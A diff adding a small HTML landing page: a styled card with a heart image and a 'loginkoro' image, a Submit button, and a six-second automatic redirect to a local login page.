@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="refresh" content="6;url=./login.html">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+  <style>
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background-image: url('https://raw.githubusercontent.com/petdoe/assets/main/raining28.gif');
+      background-repeat: no-repeat; /* Prevent the background image from repeating */
+      background-size: cover; 
+    }
+
+    #video-call-container {
+      width: 600px;
+    background-color: white;
+    border-radius: 10px;
+    padding-top: 0px;
+  
+    /* Box Shadow for Glossy Effect */
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.589), 0 4px 20px rgba(0, 0, 0, 0.589);
+  
+    /* Backdrop Filter for Blurry Effect */
+    backdrop-filter: blur(5px);
+    }
+    .image{display: flex; justify-content: center; margin-top: 20px;}
+    .image img{height: 17vh; width: 17vh; border-radius: 50%;}
+    #otp-form {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        label {
+            display: block;
+            font-size: 1.2rem;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        #otp-input {
+            font-size: 1.5rem;
+            text-align: center;
+            padding: 10px;
+            width: 160px;
+            margin-bottom: 20px;
+            border: 2px solid #3498db;
+            border-radius: 4px;
+            outline: none;
+        }
+
+        button {
+            background-color: #3498db;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 1rem;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #2980b9;
+        }
+        .refer{display: flex; justify-content: center;}
+        .refer img{width: 40vh;}
+
+  </style>
+</head>
+<body>
+  <div id="video-call-container">
+    <div class="image">
+      <img src="https://raw.githubusercontent.com/petdoe/assets/main/herz.png"/>
+      </div>
+      <div class="refer">
+      <img src="https://raw.githubusercontent.com/petdoe/assets/main/loginkoro.png">
+      </div>
+    <form id="otp-form" action="./login.html">
+      <button type="submit">Submit</button>
+  </form>
+  </div>
+</body>
+</html>
+
